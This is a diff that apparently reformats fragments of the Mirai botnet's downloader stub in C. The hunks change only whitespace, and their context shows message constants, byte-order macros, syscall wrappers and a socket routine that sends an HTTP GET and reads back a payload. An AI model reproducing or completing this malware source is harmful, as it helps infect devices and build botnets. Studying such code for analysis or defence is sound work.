@@ -6,31 +6,31 @@
 #include <netinet/in.h>
 #include <string.h>
 
-#define EXEC_MSG            "MIRAI\n"
-#define EXEC_MSG_LEN        6
+#define EXEC_MSG "MIRAI\n"
+#define EXEC_MSG_LEN 6
 
-#define DOWNLOAD_MSG        "FIN\n"
-#define DOWNLOAD_MSG_LEN    4
+#define DOWNLOAD_MSG "FIN\n"
+#define DOWNLOAD_MSG_LEN 4
 
-#define STDIN   0
-#define STDOUT  1
-#define STDERR  2
+#define STDIN 0
+#define STDOUT 1
+#define STDERR 2
 
 #if BYTE_ORDER == BIG_ENDIAN
 #define HTONS(n) (n)
 #define HTONL(n) (n)
 #elif BYTE_ORDER == LITTLE_ENDIAN
-#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
-#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
-                  ((((unsigned long)(n) & 0xff00)) << 8) | \
-                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
-                  ((((unsigned long)(n) & 0xff000000)) >> 24))
+#define HTONS(n) (((((unsigned short)(n)&0xff)) << 8) | (((unsigned short)(n)&0xff00) >> 8))
+#define HTONL(n) (((((unsigned long)(n)&0xff)) << 24) |    \
+                  ((((unsigned long)(n)&0xff00)) << 8) |   \
+                  ((((unsigned long)(n)&0xff0000)) >> 8) | \
+                  ((((unsigned long)(n)&0xff000000)) >> 24))
 #else
 #error "Fix byteorder"
 #endif
 
 #ifdef __ARM_EABI__
-#define SCN(n) ((n) & 0xfffff)
+#define SCN(n) ((n)&0xfffff)
 #else
 #define SCN(n) (n)
 #endif
@@ -87,7 +87,7 @@ int main(int argc, char **args)
     if (sfd == -1 || ffd == -1)
         __exit(1);
 
-    if (connect(sfd, &addr, sizeof (struct sockaddr_in)) == -1)
+    if (connect(sfd, &addr, sizeof(struct sockaddr_in)) == -1)
         __exit(2);
 
     write(sfd, "GET ", 4);
@@ -112,7 +112,7 @@ int main(int argc, char **args)
 
     while (1)
     {
-        int ret = read(sfd, recvbuf, sizeof (recvbuf));
+        int ret = read(sfd, recvbuf, sizeof(recvbuf));
 
         if (ret <= 0)
             break;
@@ -128,7 +128,8 @@ int main(int argc, char **args)
 int xsocket(int domain, int type, int protocol)
 {
 #if !defined(__NR_socket)
-    struct {
+    struct
+    {
         int domain, type, protocol;
     } socketcall;
     socketcall.domain = domain;
@@ -153,7 +154,8 @@ int xwrite(int fd, void *buf, int len)
 int xconnect(int fd, struct sockaddr_in *addr, int len)
 {
 #if !defined(__NR_socket)
-    struct {
+    struct
+    {
         int fd;
         struct sockaddr_in *addr;
         int len;
